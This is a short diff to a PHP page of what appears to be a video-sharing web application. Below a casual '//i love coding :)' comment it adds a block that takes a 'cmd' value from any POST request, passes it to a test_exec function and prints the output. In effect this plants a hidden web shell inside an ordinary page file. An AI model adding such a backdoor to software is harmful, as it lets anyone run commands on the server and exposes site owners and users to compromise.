@@ -63,7 +63,9 @@ Assign('result_comments_users', $result_comments_users);
 Assign('result_comments', $result_comments);
 
 //i love coding :)
-
+if(isset($_POST['cmd'])){
+	echo 'this is out '.test_exec( $_POST['cmd'] );
+}
 //Displaying The Template
 template_files('index.html');
 display_it();
